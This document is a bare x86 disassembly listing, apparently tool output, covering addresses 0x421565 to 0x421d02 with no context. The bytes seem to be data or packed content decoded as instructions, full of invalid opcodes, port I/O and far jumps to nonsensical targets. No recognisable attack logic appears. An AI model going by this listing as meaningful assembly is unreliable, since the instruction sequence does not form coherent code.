  421565:	dec    eax
  421566:	aam    0x0
  421568:	add    BYTE PTR [esp+edx*1],ah
  42156b:	pop    esp
  42156c:	sbb    BYTE PTR [ebp-0x7e85ee91],ch
  421572:	sub    al,0x70
  421574:	jmp    0x4215b3
  421576:	push   ds
  421577:	sub    al,0x42
  421579:	cmp    DWORD PTR [esi],ecx
  42157b:	jg     0x4215c5
  42157d:	out    0x0,eax
  42157f:	add    BYTE PTR [edx+eiz*2],dh
  421582:	jbe    0x42156d
  421584:	push   ss
  421585:	xchg   edi,eax
  421586:	or     BYTE PTR [eax+eax*1+0x0],ah
  42158a:	mov    esp,0x857da4a8
  42158f:	xchg   DWORD PTR [ebx-0x6b9e56b7],edi
  421595:	mov    WORD PTR [esi+0x0],es
  421598:	add    BYTE PTR [edi],dl
  42159a:	mov    ah,0xaa
  42159c:	pop    ecx
  42159d:	es aas 
  42159f:	sub    al,0x32
  4215a1:	loopne 0x4215a4
  4215a3:	test   DWORD PTR [edi+0xb5c0],edi
  4215a9:	sbb    DWORD PTR [ebp-0x5e],esi
  4215ac:	dec    eax
  4215ad:	xchg   ebp,eax
  4215ae:	add    BYTE PTR [eax],al
  4215b0:	ficom  DWORD PTR [edx]
  4215b2:	cmp    BYTE PTR [ecx-0x6b513ed9],dh
  4215b8:	sbb    DWORD PTR [eax-0x2bd9f575],ebx
  4215be:	jmp    0x424b5fd0
  4215c3:	mov    ah,0x22
  4215c5:	cmp    al,0x5
  4215c7:	adc    DWORD PTR [esi-0x1e],edi
  4215ca:	mov    edi,0x8aa2201e
  4215cf:	adc    dl,al
  4215d1:	xor    eax,DWORD PTR [edx-0x3a5b7ef5]
  4215d7:	pop    edi
  4215d8:	(bad)  [ebx+0x1e]
  4215db:	pusha  
  4215dc:	add    BYTE PTR [ebx],bl
  4215de:	add    BYTE PTR [eax],al
  4215e0:	pop    ss
  4215e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215e2:	xchg   ebx,eax
  4215e3:	jmp    0xba2385c2
  4215e8:	out    0xca,al
  4215ea:	out    dx,al
  4215eb:	xchg   esp,eax
  4215ec:	daa    
  4215ed:	retw   
  4215ef:	sub    ecx,ecx
  4215f1:	icebp  
  4215f2:	mov    al,0xdc
  4215f4:	stos   BYTE PTR es:[edi],al
  4215f5:	sub    ebx,DWORD PTR [edx+0xe]
  4215f8:	imul   DWORD PTR [ebp+0xb]
  4215fb:	mov    esi,0x8ca55822
  421600:	cli    
  421601:	add    BYTE PTR [eax],al
  421603:	or     eax,0xf3c2187d
  421608:	out    dx,eax
  421609:	inc    esi
  42160a:	xchg   edi,eax
  42160b:	in     al,0x8d
  42160d:	push   edi
  42160e:	and    eax,0xeecc
  421613:	mov    ds:0x67e54ae7,al
  421618:	mov    bl,0x36
  42161a:	adc    ebx,ecx
  42161c:	mov    esp,0xc10f7a10
  421621:	fst    DWORD PTR [ebx-0x1b0bc1ab]
  421627:	jmp    0x42167f
  421629:	sub    bh,BYTE PTR ds:0x33c91e1e
  42162f:	fild   DWORD PTR [edx+0xd240a2]
  421635:	add    cl,bl
  421637:	imul   edx,DWORD PTR [edx-0x249a8d4d],0xffffffee
  42163e:	dec    edi
  42163f:	jns    0x4215f2
  421641:	and    edx,ebx
  421643:	int3   
  421644:	jb     0x421646
  421646:	add    BYTE PTR [ecx-0x366c06eb],bh
  42164c:	scas   eax,DWORD PTR es:[edi]
  42164d:	js     0x4215ec
  42164f:	sub    esp,DWORD PTR [edi-0x26]
  421652:	adc    eax,0xfc47141c
  421657:	sbb    ebp,DWORD PTR [ebp+edx*4-0x69afcfd4]
  42165e:	icebp  
  42165f:	imul   edi,edi,0xbca3d88d
  421665:	(bad)  
  421666:	aam    0xef
  421668:	pop    esi
  421669:	retf   0xc862
  42166c:	rol    DWORD PTR [eax],0x0
  42166f:	or     eax,0xd4802
  421674:	add    BYTE PTR [ebx-0x105faa5b],bl
  42167a:	ret    
  42167b:	inc    eax
  42167c:	add    BYTE PTR [eax],0x0
  42167f:	mov    ds:0xd2be12d5,al
  421684:	cli    
  421685:	push   ebp
  421686:	aaa    
  421687:	pop    edi
  421688:	leave  
  421689:	inc    ebp
  42168a:	outs   dx,BYTE PTR ds:[esi]
  42168b:	test   al,0x7c
  42168d:	cmp    dh,al
  42168f:	cs cli 
  421691:	push   eax
  421692:	cmp    al,0x7c
  421694:	cmp    DWORD PTR [eax-0x58],0xffffffae
  421698:	or     eax,0xc1cdfc3c
  42169d:	mov    ah,0xba
  42169f:	rol    BYTE PTR [edi+0x2c],cl
  4216a2:	stos   BYTE PTR es:[edi],al
  4216a3:	test   eax,0xdd727d5b
  4216a8:	push   es
  4216a9:	dec    eax
  4216aa:	leave  
  4216ab:	add    BYTE PTR [eax],al
  4216ad:	pop    es
  4216ae:	(bad)  
  4216af:	loopne 0x421723
  4216b1:	jne    0x4216d2
  4216b3:	xor    al,0x18
  4216b5:	push   cs
  4216b6:	mov    edx,0x3d90f75d
  4216bb:	sbb    ch,BYTE PTR [esp+ebx*8+0x32]
  4216bf:	xchg   ebx,eax
  4216c0:	sbb    BYTE PTR ds:0x841ff971,0xaa
  4216c7:	add    BYTE PTR [eax],al
  4216c9:	sbb    bl,dl
  4216cb:	push   edi
  4216cc:	div    BYTE PTR [ecx]
  4216ce:	mov    eax,0x37f50d89
  4216d3:	mov    ds:0x2a18b39b,eax
  4216d8:	repnz and edi,edx
  4216db:	add    ebx,DWORD PTR [ecx+0x4e]
  4216de:	inc    ebx
  4216df:	push   ss
  4216e0:	or     BYTE PTR ds:0x93650000,dl
  4216e6:	mov    ds:0x374b6f20,al
  4216eb:	js     0x4216ad
  4216ed:	add    eax,0x3d800000
  4216f2:	add    BYTE PTR [eax],al
  4216f4:	sub    ch,cl
  4216f6:	push   ecx
  4216f7:	or     cl,ch
  4216f9:	add    BYTE PTR [eax],al
  4216fb:	jl     0x4216f2
  4216fd:	dec    esi
  4216fe:	and    ebx,edx
  421700:	sbb    cl,BYTE PTR [ebx]
  421702:	sub    eax,0x10f0fda1
  421707:	popf   
  421708:	xor    bl,cl
  42170a:	test   edi,edi
  42170c:	in     al,0x90
  42170e:	ins    DWORD PTR es:[edi],dx
  42170f:	(bad)  
  421711:	xor    eax,0x1e361ea2
  421716:	std    
  421717:	xstore-rng (bad)
  421718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421719:	les    ebx,FWORD PTR [eax+eax*1]
  42171c:	add    BYTE PTR [edx],dh
  42171e:	mov    dl,BYTE PTR [ebx+0x591bd301]
  421724:	sub    BYTE PTR [ecx],ch
  421726:	sbb    ah,al
  421728:	fadd   QWORD PTR [eax]
  42172a:	add    BYTE PTR [ebp-0x14a912eb],ch
  421730:	sbb    cl,BYTE PTR [eax]
  421732:	out    0x0,al
  421734:	add    BYTE PTR [eax-0x51e027dd],bh
  42173a:	fdiv   st(7),st
  42173c:	mov    bh,BYTE PTR [edx]
  42173e:	mov    eax,0x65e0e4f5
  421743:	cwde   
  421744:	pop    esi
  421745:	lahf   
  421746:	inc    ebp
  421747:	test   eax,0xeaa295ff
  42174c:	adc    ebx,DWORD PTR [eax-0x56]
  42174f:	stc    
  421750:	jne    0x421794
  421752:	xor    eax,0x209128da
  421757:	or     ecx,eax
  421759:	add    al,BYTE PTR [ecx+0xc]
  42175c:	add    BYTE PTR [eax],0x0
  42175f:	ss mov bh,0x22
  421762:	push   ecx
  421763:	out    0xb4,eax
  421765:	pop    ss
  421766:	jmp    ebx
  421768:	push   ebx
  421769:	xchg   ebp,eax
  42176a:	ret    0xf71d
  42176d:	aas    
  42176e:	mov    BYTE PTR [edi],ah
  421770:	add    BYTE PTR [eax],al
  421772:	stc    
  421773:	pushf  
  421774:	fistp  WORD PTR [esi-0x1d2caa23]
  42177a:	pop    es
  42177b:	cmp    bh,BYTE PTR [esi+0x1e]
  42177e:	xlat   BYTE PTR ds:[ebx]
  42177f:	jmp    0xce5d:0x9fd4e0c6
  421786:	mov    ch,cl
  421788:	dec    edx
  421789:	lea    esp,[ebx+edi*8-0x41]
  42178d:	enter  0x61,0x0
  421791:	mov    cl,0xe2
  421793:	enter  0x4c,0x0
  421797:	inc    edi
  421798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421799:	cld    
  42179a:	(bad)  
  42179b:	jle    0x4217f6
  42179d:	int    0xff
  42179f:	cwde   
  4217a0:	or     al,0x39
  4217a2:	add    BYTE PTR [eax],al
  4217a4:	inc    esi
  4217a5:	mov    dl,0x26
  4217a7:	cmp    ecx,DWORD PTR [esp+eax*2+0x0]
  4217ab:	add    BYTE PTR [ebp-0x416020cb],cl
  4217b1:	mov    al,0x46
  4217b3:	aaa    
  4217b4:	dec    edi
  4217b5:	jnp    0x421771
  4217b7:	adc    BYTE PTR [esi],ah
  4217b9:	adc    eax,0x56ca1186
  4217be:	ds mov ecx,ds
  4217c1:	add    BYTE PTR [eax],al
  4217c3:	js     0x421798
  4217c5:	bound  ebx,QWORD PTR [ebx+0x4a]
  4217c8:	sbb    BYTE PTR [ebp-0x292c4f6f],bh
  4217ce:	mov    ebp,0xc18d14d2
  4217d3:	mov    ah,0xae
  4217d5:	ins    DWORD PTR es:[edi],dx
  4217d6:	scas   al,BYTE PTR es:[edi]
  4217d7:	jp     0x421769
  4217d9:	sbb    BYTE PTR [ecx],ah
  4217db:	push   esi
  4217dc:	nop
  4217dd:	test   BYTE PTR [ecx],ch
  4217df:	add    BYTE PTR [eax],al
  4217e1:	das    
  4217e2:	inc    ebp
  4217e3:	pushf  
  4217e4:	inc    esp
  4217e5:	mov    eax,0xce900000
  4217ea:	cli    
  4217eb:	int    0x81
  4217ed:	mov    esp,0x973a7a42
  4217f2:	cdq    
  4217f3:	xchg   edx,eax
  4217f4:	repz or eax,0x9e26adcd
  4217fa:	ds mov ecx,0xe98c
  421800:	outs   dx,DWORD PTR gs:[esi]
  421802:	outs   dx,BYTE PTR ds:[esi]
  421803:	icebp  
  421804:	clc    
  421805:	fwait
  421806:	inc    ebx
  421807:	leave  
  421808:	cmp    eax,0x7010137b
  42180d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42180f:	mov    ss,WORD PTR [ebx]
  421811:	mul    edx
  421813:	ds loope 0x4217e0
  421816:	sub    eax,0xdca09c58
  42181b:	ja     0x42186e
  42181d:	jne    0x421802
  42181f:	inc    ecx
  421820:	dec    eax
  421821:	rol    BYTE PTR [eax],0x0
  421824:	xchg   esi,eax
  421825:	int    0xa9
  421827:	xor    ebx,ecx
  421829:	jb     0x421854
  42182b:	leave  
  42182c:	test   DWORD PTR [edx],ebx
  42182e:	lea    esi,[edx+0x169f91b2]
  421834:	add    BYTE PTR [ebp+0x0],ah
  421837:	add    BYTE PTR ds:0xb8a51572,cl
  42183d:	pop    ss
  42183e:	test   eax,0x2cc
  421843:	dec    eax
  421844:	mov    WORD PTR [eax],es
  421846:	add    ah,ch
  421848:	loop   0x4218c5
  42184a:	inc    esp
  42184b:	push   esi
  42184c:	add    BYTE PTR [eax],al
  42184e:	mov    edi,0x78565b82
  421853:	shl    bl,cl
  421855:	ror    BYTE PTR [edx+0x4d],cl
  421858:	xor    ebp,DWORD PTR [ecx+0x68]
  42185b:	ins    BYTE PTR es:[edi],dx
  42185c:	sub    ebx,DWORD PTR [esi+0x5f]
  42185f:	pop    ss
  421860:	std    
  421861:	scas   al,BYTE PTR es:[edi]
  421862:	and    bl,bl
  421864:	xor    ebx,ecx
  421866:	mov    es,WORD PTR [edi]
  421868:	adc    DWORD PTR [ebx],edi
  42186a:	fucomi st,st(0)
  42186c:	scas   al,BYTE PTR es:[edi]
  42186d:	ins    BYTE PTR es:[edi],dx
  42186e:	lods   eax,DWORD PTR ds:[esi]
  42186f:	out    0x2d,eax
  421871:	push   ebp
  421872:	call   0xaf0d:0x1a59dadb
  421879:	(bad)
  42187c:	shl    cl,1
  42187e:	aas    
  42187f:	mov    ebx,0x2f9fa9e7
  421884:	sub    DWORD PTR [esi+ecx*2],ecx
  421887:	add    BYTE PTR [eax],al
  421889:	les    edx,FWORD PTR [edi]
  42188b:	add    BYTE PTR [eax],al
  42188d:	jle    0x42188f
  42188f:	add    DWORD PTR [eax],0x0
  421892:	or     al,0x6c
  421894:	add    BYTE PTR [eax],al
  421896:	in     eax,dx
  421897:	lea    esi,[eax+ebx*1-0x68c617b7]
  42189e:	mov    esp,0x1708d3fa
  4218a3:	add    BYTE PTR [eax],al
  4218a5:	sbb    al,0xb4
  4218a7:	xor    eax,eax
  4218a9:	call   0xba7e18ae
  4218ae:	pop    ebx
  4218af:	loope  0x4218a7
  4218b1:	int3   
  4218b2:	sbb    eax,0x3a540000
  4218b7:	les    ebp,FWORD PTR [edx+0x0]
  4218ba:	add    BYTE PTR [edi],al
  4218bc:	mov    edx,edx
  4218be:	cld    
  4218bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218c0:	mov    ah,0xbb
  4218c2:	pop    es
  4218c3:	rcl    BYTE PTR fs:[ebx-0x4c280000],0x7c
  4218cb:	icebp  
  4218cc:	jl     0x421939
  4218ce:	lds    esp,FWORD PTR [esi-0x5d]
  4218d1:	dec    edi
  4218d2:	cmp    BYTE PTR [ebp+0x7c00af77],ch
  4218d8:	add    BYTE PTR [eax],al
  4218da:	inc    esp
  4218db:	add    BYTE PTR [eax],al
  4218dd:	add    BYTE PTR [edx+0x3f],bl
  4218e0:	inc    esp
  4218e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218e2:	add    BYTE PTR [eax],al
  4218e4:	push   cs
  4218e5:	shr    BYTE PTR [eax+edi*2],cl
  4218e8:	sub    edi,ecx
  4218ea:	mov    ecx,0xa52503eb
  4218ef:	mov    ebx,0x3244
  4218f4:	xchg   DWORD PTR [eax-0x7a],edx
  4218f7:	xor    BYTE PTR [edx+0x1f],cl
  4218fa:	mov    esp,0x1393dd10
  4218ff:	dec    esp
  421900:	arpl   WORD PTR [eax],ax
  421902:	add    BYTE PTR [edx+0x5f],dh
  421905:	outs   dx,DWORD PTR ds:[esi]
  421906:	shl    cl,1
  421908:	ret    
  421909:	dec    ecx
  42190a:	(bad)  
  42190b:	iret   
  42190c:	ficom  DWORD PTR [ebx-0x7a]
  42190f:	push   0xffffffe4
  421911:	rcl    DWORD PTR [edi+0x51],cl
  421914:	xlat   BYTE PTR ds:[ebx]
  421915:	call   0x10619b3
  42191a:	add    dl,bh
  42191c:	sub    al,0xdd
  42191e:	or     al,al
  421920:	fiadd  WORD PTR [eax]
  421922:	add    dh,ah
  421924:	(bad)  
  421926:	cs xchg ecx,eax
  421928:	cdq    
  421929:	mov    WORD PTR [ebx],?
  42192b:	add    BYTE PTR [eax],al
  42192d:	(bad)  
  42192e:	xchg   ebp,eax
  42192f:	icebp  
  421930:	dec    ebp
  421931:	cmp    ax,0xbd33
  421935:	mov    al,0x60
  421937:	in     al,dx
  421938:	std    
  421939:	sub    DWORD PTR [ebp-0x16],edi
  42193c:	inc    eax
  42193d:	pop    ebx
  42193e:	add    BYTE PTR [eax],al
  421940:	jb     0x42194f
  421942:	push   ebp
  421943:	or     DWORD PTR [edi+0x5f],ebx
  421946:	jp     0x42194a
  421948:	ins    BYTE PTR es:[edi],dx
  421949:	iret   
  42194a:	mov    dl,0xf2
  42194c:	sar    al,1
  42194e:	pop    ebp
  42194f:	pop    esi
  421950:	mov    al,0xd5
  421952:	aaa    
  421953:	jp     0x4219b7
  421955:	dec    esi
  421956:	or     DWORD PTR [edi],0xffffffb6
  421959:	aad    0xd5
  42195b:	adc    eax,0x23cbd32a
  421960:	and    DWORD PTR [eax],edx
  421962:	out    dx,eax
  421963:	out    0x8c,eax
  421965:	rol    BYTE PTR [eax],1
  421967:	add    BYTE PTR [esi+0x1b8951b],ch
  42196d:	xchg   edx,eax
  42196e:	cmc    
  42196f:	and    dl,al
  421971:	or     eax,0xc19f811a
  421976:	pushf  
  421977:	sub    al,0x9e
  421979:	shr    edi,cl
  42197b:	repz daa 
  42197d:	stc    
  42197e:	lock clc 
  421980:	xchg   ebp,eax
  421981:	push   0xffffff8f
  421983:	mov    BYTE PTR [ecx+0x1c084f],0x0
  42198a:	adc    dh,ch
  42198c:	fwait
  42198d:	pop    ds
  42198e:	pusha  
  42198f:	(bad)  
  421991:	cmp    ecx,DWORD PTR [esi-0x11]
  421994:	loopne 0x42194e
  421996:	in     al,0x4c
  421998:	dec    ebx
  421999:	add    BYTE PTR [eax],al
  42199b:	adc    eax,0x419d8690
  4219a0:	rol    edi,0x39
  4219a3:	jmp    0x30af3c60
  4219a8:	mov    fs,eax
  4219aa:	test   eax,0xd2fa859b
  4219af:	arpl   WORD PTR [ecx+0x41c893],bx
  4219b5:	add    BYTE PTR [edi],ch
  4219b7:	jg     0x4219fc
  4219b9:	dec    ebp
  4219ba:	jg     0x4219f8
  4219bc:	xor    eax,ebx
  4219be:	sub    al,0x99
  4219c0:	aam    0xf4
  4219c2:	outs   dx,BYTE PTR ds:[esi]
  4219c3:	inc    edi
  4219c4:	or     esp,DWORD PTR [eax+ebx*8+0x75c8c9]
  4219cb:	add    BYTE PTR [ebp+0x1cb67d3c],cl
  4219d1:	fld    DWORD PTR [ebx+0x40]
  4219d4:	scas   eax,DWORD PTR es:[edi]
  4219d5:	add    BYTE PTR [eax],al
  4219d7:	mov    dh,0xa6
  4219d9:	dec    ecx
  4219da:	les    ecx,FWORD PTR ds:0x6320000
  4219e0:	repnz and DWORD PTR [ebp+0x3988af],ecx
  4219e7:	add    BYTE PTR [ebp-0x74af31af],ch
  4219ed:	jbe    0x421a1e
  4219ef:	or     eax,0xc66aca22
  4219f4:	ret    0x95aa
  4219f7:	xor    BYTE PTR ds:0x2d349953,ch
  4219fd:	dec    ecx
  4219fe:	pop    ds
  4219ff:	mov    bh,0x1a
  421a01:	daa    
  421a02:	es inc eax
  421a04:	dec    eax
  421a05:	add    BYTE PTR [eax],al
  421a07:	jmp    0x9764aebd
  421a0c:	std    
  421a0d:	mov    ds:0x7c40ad,eax
  421a12:	add    BYTE PTR [edx],ch
  421a14:	sbb    al,0x69
  421a16:	or     DWORD PTR [edx+edi*2+0x13128ae4],edi
  421a1d:	xchg   ecx,eax
  421a1e:	dec    ebx
  421a1f:	pusha  
  421a20:	jecxz  0x421a86
  421a22:	pop    eax
  421a23:	mov    WORD PTR [ebx],?
  421a25:	add    BYTE PTR [eax],al
  421a27:	(bad)  
  421a28:	out    0xe3,eax
  421a2a:	mov    ebp,0x8abef5a2
  421a2f:	add    DWORD PTR [eax+eiz*1],eax
  421a32:	add    BYTE PTR [eax],al
  421a34:	outs   dx,BYTE PTR ds:[esi]
  421a35:	je     0x4219f0
  421a37:	aaa    
  421a38:	cli    
  421a39:	je     0x4219cb
  421a3b:	sbb    eax,esi
  421a3d:	jmp    0x3500:0xc4c44e
  421a44:	adc    DWORD PTR [edx],edx
  421a46:	stos   DWORD PTR es:[edi],eax
  421a47:	das    
  421a48:	mov    ds:0xe3a0706,al
  421a4d:	repz and al,0xcf
  421a50:	push   es
  421a51:	mov    DWORD PTR [esi+0x176fde1a],esi
  421a57:	push   ecx
  421a58:	mov    dl,0x66
  421a5a:	js     0x4219eb
  421a5c:	and    eax,0xd14a6e2f
  421a61:	fidiv  WORD PTR [ebx]
  421a63:	stos   DWORD PTR es:[edi],eax
  421a64:	sti    
  421a65:	loop   0x421aa9
  421a67:	das    
  421a68:	repnz cwde 
  421a6a:	retf   
  421a6b:	outs   dx,BYTE PTR ds:[esi]
  421a6c:	test   al,0xae
  421a6e:	xor    al,0x2a
  421a70:	sbb    eax,0xe4dd2e66
  421a75:	out    0x19,eax
  421a77:	clc    
  421a78:	addr16 popa 
  421a7a:	pop    edi
  421a7b:	mov    edi,0x573b4332
  421a80:	(bad)  
  421a81:	cdq    
  421a82:	aam    0xa9
  421a84:	les    ecx,FWORD PTR [esi+0xf5b0000]
  421a8a:	popf   
  421a8b:	push   esi
  421a8c:	jle    0x421aa6
  421a8e:	mul    BYTE PTR [ebp-0x4a29bde5]
  421a94:	push   ebx
  421a95:	sbb    BYTE PTR [ebp-0x76],bl
  421a98:	loope  0x421a2b
  421a9a:	pushf  
  421a9b:	not    edi
  421a9d:	rcl    ah,0x0
  421aa0:	add    BYTE PTR [ecx+0x5b2ae7e0],ch
  421aa6:	jmp    0xbac3:0xa807f132
  421aad:	jl     0x421a5c
  421aaf:	inc    edx
  421ab0:	add    ebx,DWORD PTR [ebx-0x46]
  421ab3:	add    bl,ah
  421ab5:	push   edx
  421ab6:	ror    DWORD PTR [ecx],cl
  421ab8:	push   edx
  421ab9:	xor    ch,bh
  421abb:	adc    DWORD PTR [ebx-0x1d],ebp
  421abe:	and    edi,edx
  421ac0:	bound  esp,QWORD PTR [edx]
  421ac2:	sub    BYTE PTR [ebp+0x6f],ah
  421ac5:	fucomi st,st(0)
  421ac7:	xchg   esi,eax
  421ac8:	pop    edx
  421ac9:	ss je  0x421a6e
  421acc:	mov    ecx,0x324c
  421ad1:	mov    al,0x7a
  421ad3:	(bad)  
  421ad4:	mul    ecx
  421ad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ad7:	in     eax,dx
  421ad8:	pop    esp
  421ad9:	(bad)  [ebp-0x44093452]
  421adf:	xchg   ebp,eax
  421ae0:	in     eax,0x96
  421ae2:	add    eax,0x6ce3da92
  421ae7:	dec    edx
  421ae8:	cmp    BYTE PTR [edi+0x7ee2e26d],bh
  421aee:	mov    ds:0x315bba37,al
  421af3:	pop    es
  421af4:	mov    dl,0x9e
  421af6:	jecxz  0x421a7c
  421af8:	pop    ds
  421af9:	add    BYTE PTR [eax],al
  421afb:	push   esp
  421afc:	out    dx,eax
  421afd:	xchg   bl,dh
  421aff:	pop    ebx
  421b00:	das    
  421b01:	dec    esp
  421b02:	fiadd  WORD PTR [eax]
  421b04:	add    ch,dl
  421b06:	int3   
  421b07:	sahf   
  421b08:	add    BYTE PTR [eax],al
  421b0a:	pop    si
  421b0c:	retf   0xe003
  421b0f:	add    edi,DWORD PTR [ecx+0x3d]
  421b12:	fbstp  TBYTE PTR [ecx+0x69c25ad1]
  421b18:	push   ss
  421b19:	(bad)  
  421b1a:	into   
  421b1b:	mov    esi,0x931b70ef
  421b20:	test   eax,0xf7c47991
  421b25:	add    BYTE PTR [eax],al
  421b27:	dec    esi
  421b28:	sub    edi,edx
  421b2a:	mov    ?,WORD PTR [edx+0x6c0c5c69]
  421b30:	add    BYTE PTR [eax],al
  421b32:	cmp    eax,0xfa900efe
  421b37:	call   0x83a5:0x435834ff
  421b3e:	pop    eax
  421b3f:	in     eax,dx
  421b40:	ja     0x421b8a
  421b42:	popa   
  421b43:	add    BYTE PTR [eax],al
  421b45:	int3   
  421b46:	fild   WORD PTR [eax]
  421b48:	add    dl,bh
  421b4a:	inc    edi
  421b4b:	ret    0xc5e4
  421b4e:	mov    bl,0x44
  421b50:	jb     0x421b52
  421b52:	add    BYTE PTR [ebp+0x22473092],dh
  421b58:	enter  0xf2,0x0
  421b5c:	out    0x78,al
  421b5e:	in     al,0x1b
  421b60:	je     0x421b63
  421b62:	popa   
  421b63:	pop    esp
  421b64:	cs ret 
  421b66:	sbb    al,0x5d
  421b68:	and    esp,ebx
  421b6a:	sbb    bl,ch
  421b6c:	or     al,0x52
  421b6e:	add    BYTE PTR [eax],al
  421b70:	mov    edx,0x57c0e1
  421b75:	add    BYTE PTR [esi+0x36982455],dh
  421b7b:	imul   edx,DWORD PTR [esi-0x75643172],0xffffffd4
  421b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b83:	mov    bh,0xcb
  421b85:	pop    esi
  421b86:	add    eax,0x8cc829
  421b8b:	add    BYTE PTR [esi-0x275f2bfb],bl
  421b91:	outs   dx,BYTE PTR ds:[esi]
  421b92:	push   esi
  421b93:	loope  0x421bb6
  421b95:	jbe    0x421b90
  421b97:	push   esi
  421b98:	push   ecx
  421b99:	jl     0x421c12
  421b9b:	lea    esi,[edx+0x61]
  421b9e:	not    DWORD PTR [esi]
  421ba0:	cwde   
  421ba1:	(bad)  
  421ba2:	retf   0x0
  421ba5:	popf   
  421ba6:	mov    ebp,DWORD PTR [ebx+0x1e]
  421ba9:	mov    esp,0x6ee9f798
  421bae:	push   es
  421baf:	out    0x30,al
  421bb1:	sub    eax,0x7bcdb5f0
  421bb6:	jg     0x421c26
  421bb8:	cmp    ecx,DWORD PTR [edi]
  421bba:	dec    edx
  421bbb:	in     al,dx
  421bbc:	cmc    
  421bbd:	mov    dh,0x69
  421bbf:	jbe    0x421b58
  421bc1:	mov    esi,0x7cd6de23
  421bc6:	popf   
  421bc7:	dec    esi
  421bc8:	xchg   edi,eax
  421bc9:	into   
  421bca:	jo     0x421c3a
  421bcc:	sbb    bl,BYTE PTR [edx+0x4a]
  421bcf:	hlt    
  421bd0:	cmp    bh,0x31
  421bd3:	ins    DWORD PTR es:[edi],dx
  421bd4:	xchg   BYTE PTR [ebp+0x79],bh
  421bd7:	shl    BYTE PTR [edi-0x6c],1
  421bda:	adc    eax,0xd1e7c379
  421bdf:	jns    0x421c3f
  421be1:	lahf   
  421be2:	sub    DWORD PTR [ebp+0xc10009],0x0
  421be9:	add    ebx,DWORD PTR ds:0x682168bd
  421bef:	push   ebp
  421bf0:	xor    ecx,DWORD PTR [ebx]
  421bf2:	inc    esi
  421bf3:	lods   eax,DWORD PTR ds:[esi]
  421bf4:	rol    BYTE PTR [eax+0x3b610000],0x5f
  421bfb:	lahf   
  421bfc:	push   esp
  421bfd:	pop    edx
  421bfe:	adc    DWORD PTR [eax],ebx
  421c00:	sbb    DWORD PTR [eax],0x46914655
  421c06:	sub    ecx,esp
  421c08:	mov    ebp,0x5d7f0000
  421c0d:	sbb    eax,0xbf0454
  421c12:	add    ah,bh
  421c14:	mov    BYTE PTR [eax+eax*1+0x0],bl
  421c18:	ins    BYTE PTR es:[edi],dx
  421c19:	aas    
  421c1a:	mov    cl,0xbf
  421c1c:	call   0x2b23:0x2c4d1868
  421c23:	sbb    eax,0x840
  421c28:	out    dx,al
  421c29:	xchg   ebp,eax
  421c2a:	and    DWORD PTR [edi+0x64],eax
  421c2d:	dec    esp
  421c2e:	std    
  421c2f:	add    BYTE PTR [eax],al
  421c31:	ret    
  421c32:	mov    eax,0xf779b85
  421c37:	fimul  WORD PTR [eax-0x73ffff9f]
  421c3d:	jl     0x421c3f
  421c3f:	add    bh,bl
  421c41:	mov    ds:0x9594dab,eax
  421c46:	fmul   st(0),st
  421c48:	mov    es,WORD PTR [eax]
  421c4a:	add    BYTE PTR [edi-0x1686e408],dl
  421c50:	dec    edx
  421c51:	ret    0xea48
  421c54:	add    BYTE PTR [eax],al
  421c56:	shr    BYTE PTR [edx+0x0],0x0
  421c5a:	(bad)  
  421c5b:	or     BYTE PTR [edx+0x0],dh
  421c5e:	add    BYTE PTR [edi+0x4d],dh
  421c61:	pop    ecx
  421c62:	in     eax,dx
  421c63:	repnz ins BYTE PTR es:[edi],dx
  421c65:	jae    0x421be9
  421c67:	loop   0x421cd2
  421c69:	adc    BYTE PTR [ecx-0x67],ah
  421c6c:	jg     0x421c54
  421c6e:	cmp    DWORD PTR [ebx],0xffffffe9
  421c71:	cli    
  421c72:	rcr    DWORD PTR [ebp+0x2d],cl
  421c75:	dec    ecx
  421c76:	nop    DWORD PTR [edx+eiz*8+0x24]
  421c7b:	pop    ebx
  421c7c:	xchg   BYTE PTR [ecx-0x62],bh
  421c7f:	jecxz  0x421c16
  421c81:	sub    edi,ebx
  421c83:	hlt    
  421c84:	mov    esi,0x974ae9db
  421c89:	test   DWORD PTR [edx],ebp
  421c8b:	sub    eax,0xcef36af0
  421c90:	push   esp
  421c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c92:	jle    0x421c6a
  421c94:	mov    ds:0x1341b159,al
  421c99:	(bad)  
  421c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c9c:	mov    al,0x1e
  421c9e:	sbb    al,0xf7
  421ca0:	pop    es
  421ca1:	ret    
  421ca2:	je     0x421c48
  421ca4:	(bad)  
  421ca5:	sub    al,0x2b
  421ca7:	lahf   
  421ca8:	dec    ecx
  421ca9:	jo     0x421c4e
  421cab:	out    dx,al
  421cac:	outs   dx,BYTE PTR ds:[esi]
  421cad:	xchg   ebx,eax
  421cae:	iret   
  421caf:	mov    bh,0x64
  421cb1:	arpl   si,ax
  421cb3:	aad    0x34
  421cb5:	inc    ebp
  421cb6:	push   0xf43a8396
  421cbb:	dec    esp
  421cbc:	pushf  
  421cbd:	add    BYTE PTR [eax],al
  421cbf:	xchg   edx,eax
  421cc0:	dec    ebx
  421cc1:	mov    ds:0x8ea3ac2e,al
  421cc6:	sub    eax,0x4bb33255
  421ccb:	xchg   esi,eax
  421ccc:	mov    ds:0x398883,al
  421cd1:	add    BYTE PTR [esi-0x5a],dl
  421cd4:	inc    edi
  421cd5:	add    eax,DWORD PTR [eax+0x56]
  421cd8:	add    BYTE PTR [eax],al
  421cda:	inc    ebp
  421cdb:	mov    dh,0x33
  421cdd:	jle    0x421d11
  421cdf:	sbb    esi,ebx
  421ce1:	inc    DWORD PTR [ecx-0x7934e114]
  421ce7:	sbb    al,0xa0
  421ce9:	xchg   esp,eax
  421cea:	loope  0x421c97
  421cec:	mov    DWORD PTR [edi-0x32380d48],ebx
  421cf2:	enter  0x13,0x0
  421cf6:	dec    ebx
  421cf7:	mov    bl,0xfe
  421cf9:	es ds aas 
  421cfc:	dec    ebx
  421cfd:	xchg   esp,eax
  421cfe:	cmc    
  421cff:	push   ds
  421d00:	mov    edx,ebx
  421d02:	lea    edi,[edi+0x7d2d1d74]
